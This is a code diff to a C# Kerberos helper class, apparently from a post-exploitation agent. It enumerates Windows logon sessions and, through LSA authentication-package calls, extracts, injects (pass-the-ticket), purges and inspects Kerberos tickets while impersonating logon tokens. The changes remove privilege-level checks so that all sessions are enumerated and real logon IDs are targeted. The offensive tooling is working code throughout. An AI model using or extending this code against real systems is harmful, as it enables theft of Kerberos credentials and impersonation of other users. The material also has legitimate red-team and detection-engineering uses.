@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
@@ -20,12 +21,12 @@ namespace KerberosTickets;
 internal class KerberosHelpers
 {
     private static HANDLE systemHandle { get; set; }
-    
+
     private static List<Artifact> createdArtifacts = new List<Artifact>();
-    
-    
-    
-    
+
+
+
+
     //private helper methods
     private static HANDLE GetLsaHandleUntrusted(bool elevateToSystem = true)
     {
@@ -88,38 +89,30 @@ internal class KerberosHelpers
         return authPackage;
     }
 
-    
+
 
     private static IEnumerable<LUID> GetLogonSessions()
     {
         List<LUID> logonIds = [];
         try
         {
-            if (Agent.GetIdentityManager().GetIntegrityLevel() >= IntegrityLevel.HighIntegrity)
+            // get all logon ids
+            DebugHelp.DebugWriteLine("enumerating logon session");
+            WindowsAPI.LsaEnumerateLogonSessionsDelegate(out uint logonCount, out HANDLE logonIdHandle);
+            createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaEnumerateLogonSessions"));
+            var logonWorkingHandle = logonIdHandle;
+            for (var i = 0; i < logonCount; i++)
             {
-                // get all logon ids
-                DebugHelp.DebugWriteLine("enumerating logon session");
-                WindowsAPI.LsaEnumerateLogonSessionsDelegate(out uint logonCount, out HANDLE logonIdHandle);
-                createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaEnumerateLogonSessions"));
-                var logonWorkingHandle = logonIdHandle;
-                for (var i = 0; i < logonCount; i++)
+                var logonId = logonWorkingHandle.CastTo<LUID>();
+                if (logonId.IsNull || logonIds.Contains(logonId))
                 {
-                    var logonId = logonWorkingHandle.CastTo<LUID>();
-                    if (logonId.IsNull || logonIds.Contains(logonId))
-                    {
-                        DebugHelp.DebugWriteLine("LogonId is null or is already in the list, skipping");
-                        continue;
-                    }
-                    logonIds.Add(logonId);
-                    logonWorkingHandle = logonWorkingHandle.Increment();
+                    DebugHelp.DebugWriteLine("LogonId is null or is already in the list, skipping");
+                    continue;
                 }
-                WindowsAPI.LsaFreeReturnBufferDelegate(logonIdHandle);
+                logonIds.Add(logonId);
+                logonWorkingHandle = logonWorkingHandle.Increment();
             }
-            else
-            {
-                // we can only get our own if not elevated
-                logonIds.Add(GetCurrentLuid());
-            }
+            WindowsAPI.LsaFreeReturnBufferDelegate(logonIdHandle);
         }
         catch (Exception e)
         {
@@ -136,6 +129,11 @@ internal class KerberosHelpers
         {
             WindowsAPI.LsaGetLogonSessionDataDelegate(luidHandle, out logonSessionDataHandle);
             createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaGetLogonSessionData"));
+            if(logonSessionDataHandle.IsNull)
+            {
+                DebugHelp.DebugWriteLine($"Error getting logon session data");
+                return new LogonSessionData();
+            }
             var seclogonSessionData = logonSessionDataHandle.CastTo<SECURITY_LOGON_SESSION_DATA>();
             LogonSessionData sessionData = new()
             {
@@ -163,7 +161,7 @@ internal class KerberosHelpers
             WindowsAPI.LsaFreeReturnBufferDelegate(logonSessionDataHandle);
         }
     }
-    
+
     private static IEnumerable<KerberosTicket> GetTicketCache(HANDLE lsaHandle, uint authPackage, LUID logonId)
     {
         //needs to be elevated to pass in a logon id so if we arent we wipe the value here
@@ -174,7 +172,7 @@ internal class KerberosHelpers
         }
         // tickets to return
         List<KerberosTicket> tickets = [];
-        
+
         KERB_QUERY_TKT_CACHE_REQUEST request = new()
         {
             MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
@@ -192,7 +190,7 @@ internal class KerberosHelpers
             return tickets;
         }
         var response = returnBuffer.CastTo<KERB_QUERY_TKT_CACHE_RESPONSE>();
-        
+
         if (response.CountOfTickets == 0)
         {
             DebugHelp.DebugWriteLine("No tickets found");
@@ -244,7 +242,7 @@ internal class KerberosHelpers
             }
             DebugHelp.DebugWriteLine("Got LSA Handle");
             connectionInfo.Item1 = lsaHandle;
-            
+
             // get auth package
             LSA_IN_STRING packageName = new("kerberos");
             HANDLE<LSA_IN_STRING> packageNameHandle = new(packageName);
@@ -262,7 +260,6 @@ internal class KerberosHelpers
             // get all logon sessions
             if (GetSessions)
             {
-                DebugHelp.DebugWriteLine("Getting Logon Sessions");
                 var logonSessions = GetLogonSessions();
                 var logonSessionList = logonSessions.ToList();
                 DebugHelp.DebugWriteLine($"Found {logonSessionList.Count()} logon sessions");
@@ -295,7 +292,7 @@ internal class KerberosHelpers
             {
                 createdArtifacts.Add(Artifact.PlaintextLogon(userName.ToString()));
             }
-            //debug get the luid for the token 
+            //debug get the luid for the token
             int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
             HANDLE tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
             WindowsAPI.GetTokenInformationDelegate(token, Win32.TokenInformationClass.TokenStatistics,tokenInfo, tokenInfoSize, out int returnLength);
@@ -312,7 +309,7 @@ internal class KerberosHelpers
             return new();
         }
     }
-    
+
     /// <summary>
     /// Gets any created artifacts that were produced between the current call and the last call to this method
     /// </summary>
@@ -324,7 +321,7 @@ internal class KerberosHelpers
         createdArtifacts.Clear();
         return artifacts;
     }
-    
+
     //internal methods but are exposed via the KerberosTicketManager
     internal static LUID GetCurrentLuid()
     {
@@ -343,8 +340,8 @@ internal class KerberosHelpers
         }
         return new LUID();
     }
-    
-    
+
+
     internal static LUID GetTargetProcessLuid(int pid)
     {
         HANDLE tokenInfo = new();
@@ -397,7 +394,7 @@ internal class KerberosHelpers
             WindowsAPI.CloseHandleDelegate(targetProcessHandle);
         }
     }
-    
+
     //get all tickets
     internal static IEnumerable<KerberosTicket> TriageTickets(bool getSystemTickets = false, string targetLuid = "")
     {
@@ -443,8 +440,8 @@ internal class KerberosHelpers
         }
         return allTickets;
     }
-    
-    
+
+
     //extract ticket
     internal static KerberosTicket? ExtractTicket(LUID targetLuid, string targetName)
     {
@@ -467,7 +464,7 @@ internal class KerberosHelpers
                 DebugHelp.DebugWriteLine($"Failed to find ticket for {targetName}");
                 return null;
             }
-            
+
             KERB_RETRIEVE_TKT_REQUEST request = new()
             {
                 MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
@@ -504,8 +501,8 @@ internal class KerberosHelpers
             }
             //convert the location of the ticket in memory to a struct
             var response = returnBuffer.CastTo<KERB_RETRIEVE_TKT_RESPONSE>();
-            
-            //make sure the ticket has some data 
+
+            //make sure the ticket has some data
             if (response.Ticket.EncodedTicketSize == 0)
             {
                 DebugHelp.DebugWriteLine("No ticket Data to extract");
@@ -523,8 +520,8 @@ internal class KerberosHelpers
             return null;
         }
     }
-    
-    // load ticket 
+
+    // load ticket
     internal static bool LoadTicket(byte[] submittedTicket, LUID targetLuid)
     {
         HANDLE requestAndTicketHandle = new();
@@ -536,11 +533,11 @@ internal class KerberosHelpers
             //Discarding the logonSessions because we do not need them so we pass false to prevent enumerating them
             (lsaHandle, uint authPackage, IEnumerable<LUID> _) = InitKerberosConnectionAndSessionInfo(false);
             //if we are not an admin user then we cannot send a real lUID so we need to send a null one
-            if (Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
-            {
-                DebugHelp.DebugWriteLine("Not high integrity, setting targetLuid to 0");
-                targetLuid = new LUID();
-            }
+            //if (Agent.GetIdentityManager().GetIntegrityLevel() <= IntegrityLevel.MediumIntegrity)
+            //{
+            //    DebugHelp.DebugWriteLine("Not high integrity, setting targetLuid to 0");
+               // targetLuid = new LUID();
+            //}
             //get the size of the request structure
             var requestSize = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>();
 
@@ -551,26 +548,25 @@ internal class KerberosHelpers
                 KerbCredSize = submittedTicket.Length,
                 KerbCredOffset = requestSize,
             };
-            
+
             //get the size of the required parts and allocate memory for the struct and the ticket
             var ticketSize = submittedTicket.Length;
             DebugHelp.DebugWriteLine($"Ticket is of size {ticketSize}");
             var requestPlusTicketSize = requestSize + ticketSize;
             DebugHelp.DebugWriteLine($"Allocating memory for request and ticket of size {requestPlusTicketSize}");
             requestAndTicketHandle = new(Marshal.AllocHGlobal(requestPlusTicketSize));
-            
+
             //write the request to the start of the new memory block
             Marshal.StructureToPtr(request, requestAndTicketHandle, false);
             //get the address of the end of the struct
             HANDLE requestEndAddress = new(new(requestAndTicketHandle.PtrLocation.ToInt64() + requestSize));
             //write the ticket to the end of the struct
             Marshal.Copy(submittedTicket, 0, requestEndAddress.PtrLocation, ticketSize);
-            
+
             //submit the ticket
             DebugHelp.DebugWriteLine($"Submitting ticket of size {ticketSize} to LSA");
             var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestAndTicketHandle, requestPlusTicketSize, out returnBuffer, out uint returnLength, out NTSTATUS returnStatus);
             createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaCallAuthenticationPackage"));
-
             if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
             {
                 DebugHelp.DebugWriteLine($"Failed to submit ticket with api status: {status} and return status: {returnStatus}");
@@ -590,10 +586,10 @@ internal class KerberosHelpers
             //is checked because for some operations loading the ticket is not the final step so we may want to keep the handle open
             WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
             createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaDeregisterLogonProcess"));
-            
+
         }
     }
-    
+
     // unload ticket
     internal static bool UnloadTicket(string serviceName, string domainName, LUID targetLuid, bool All)
     {
@@ -617,7 +613,7 @@ internal class KerberosHelpers
                 MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage,
                 LogonId = Agent.GetIdentityManager().GetIntegrityLevel() <= IntegrityLevel.MediumIntegrity ? new LUID() : targetLuid
             };
-            
+
             // Marshal the request structure first
             Marshal.StructureToPtr(request, requestBuffer, false);
 
@@ -677,7 +673,7 @@ internal class KerberosHelpers
             createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaDeregisterLogonProcess"));
         }
     }
-    
+
     //describe ticket
     internal static KerberosTicket? TryGetTicketDetailsFromKirbi(byte[] kirbiTicket)
     {
@@ -695,11 +691,22 @@ internal class KerberosHelpers
                 WindowsAPI.ImpersonateLoggedOnUserDelegate(newlogonHandle);
                 createdArtifacts.Add(Artifact.WindowsAPIInvoke("ImpersonateLoggedOnUser"));
                 //passing new luid here is fine because we have switched to the new logon session
-                LoadTicket(kirbiTicket, new LUID());
-                ticket = TriageTickets().FirstOrDefault();
-                ticket.Kirbi = kirbiTicket;
+                int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
+                HANDLE tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
+                WindowsAPI.GetTokenInformationDelegate(newlogonHandle, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength);
+                createdArtifacts.Add(Artifact.WindowsAPIInvoke("GetTokenInformation"));
+                TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
+                LoadTicket(kirbiTicket, tokenStats.AuthenticationId);
+                ticket = TriageTickets(getSystemTickets:true, targetLuid:$"{tokenStats.AuthenticationId}").FirstOrDefault();
+                if(ticket != null)
+                {
+                    ticket.Kirbi = kirbiTicket;
+                    DebugHelp.DebugWriteLine($"Converted base64 ticket to KerberosTicket: {ticket.ToString().ToIndentedString()}");
+                } else
+                {
+                    DebugHelp.DebugWriteLine($"Failed to triage any tickets");
+                }
             }
-            DebugHelp.DebugWriteLine($"Converted base64 ticket to KerberosTicket: {ticket.ToString().ToIndentedString()}");
         }
         catch (Exception e)
         {
